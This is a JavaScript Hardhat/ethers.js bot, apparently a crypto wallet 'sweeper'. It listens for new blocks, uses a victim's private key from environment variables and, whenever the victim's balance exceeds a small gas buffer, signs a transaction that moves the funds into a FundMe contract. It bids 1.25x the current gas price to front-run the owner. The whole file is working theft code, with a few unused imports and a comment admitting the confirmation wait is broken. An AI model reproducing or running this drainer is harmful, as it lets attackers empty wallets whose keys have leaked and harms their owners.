const { isCommunityResourcable } = require("@ethersproject/providers");
const { ethers } = require("hardhat");
const { boolean } = require("hardhat/internal/core/params/argumentTypes");
require('dotenv').config();

const provider = new ethers.providers.JsonRpcProvider(process.env.ATTACKER_RPC_URL);
const attackerAddress = process.env.ATTACKER_PUBLIC_KEY;
const victimPrivateKey = process.env.VICTIM_PRIVATE_KEY;

const bot = async () => {

    const FundMeAttacker = await ethers.getContractFactory("FundMe");
    const contract = await FundMeAttacker.attach(
        process.env.FUND_ME_CONTRACT // The deployed contract address of FundMe.sol
    );

    provider.on("block", async () => {
        console.log("BLOCK #" + await provider.getBlockNumber());
        const victimWallet = new ethers.Wallet(victimPrivateKey);
        const victim = victimWallet.connect(provider);
        const victimBalance = ethers.utils.formatEther(await provider.getBalance(victim.address));
        const attackerBalance = ethers.utils.formatEther(await provider.getBalance(attackerAddress));
        console.log("Attacker ETH Balance: " + attackerBalance);
        console.log("Victim ETH Balance: " + victimBalance);

        //Minimum ETH required to pay for gasFees
        const txBuffer = ethers.utils.parseEther(".08");
        const txBufferinETH = ethers.utils.formatEther(txBuffer);
        //console.log(victimBalance - txBufferinETH > 0);

        if (victimBalance - txBufferinETH > 0) {
            console.log("ETH FOUND!");
            const amountToTransfer = victimBalance - txBufferinETH;
            try {
                const gasPrice = await provider.getGasPrice();
                var gasPriceinGwei = ethers.utils.formatUnits(gasPrice, "gwei");
        
                console.log("Current current price in (gwei): " + gasPriceinGwei);
                gasPriceinGwei *= 1.25; // set the gasPrice to a 1.25x of the current price
                console.log("Set gasPrice : " + gasPriceinGwei);
        
                //convert gwei to ether
                const attackerGasPrice = ethers.utils.parseUnits(gasPriceinGwei.toFixed(9), 9);
        
                const attackerGasPriceGwei = ethers.utils.formatUnits(attackerGasPrice, "gwei");
                console.log("Set gasPrice (in gwei): " + attackerGasPriceGwei);

                const currentNonce = await provider.getTransactionCount(victimWallet.address);

                const tx = await contract.connect(victim).deposit({
                    from: victimWallet.address,
                    value: ethers.utils.parseEther(amountToTransfer.toString()),
                    gasPrice: attackerGasPrice,
                    nonce: currentNonce
                });
                console.log(tx);
                const receipt = await tx.wait(6); //wait for 6 confirmations
                //the wait functionality is currently a bit broken will fix it soon        
            }
            catch (e) {
                console.log(`error: ${e}`);
            }        
        };
    
        console.log("------------------------------------------------------------------------------------------");
        
    });
}

bot();